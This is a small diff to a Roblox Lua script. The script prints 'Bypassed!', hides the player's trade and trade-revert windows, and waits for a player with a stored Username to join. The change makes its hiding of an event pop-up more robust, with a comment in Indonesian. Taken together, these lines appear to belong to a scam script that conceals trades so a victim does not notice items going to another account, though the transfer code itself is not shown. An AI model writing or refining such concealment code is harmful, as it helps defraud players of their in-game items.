@@ -140,7 +140,10 @@ print("Bypassed!")
 end
 game:GetService("Players").LocalPlayer.PlayerGui.TradeRevertApp.Enabled = false
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-game:GetService("Players").LocalPlayer.PlayerGui.eventPopup.Enabled = false
+local eventPopup = playerGui:FindFirstChild("EventPopupApp")
+if eventPopup then
+    eventPopup.Enabled = false  -- Menyembunyikan pop-up
+end
 
 game.Players.PlayerAdded:Connect(function(player)
   if player.Name == Username then
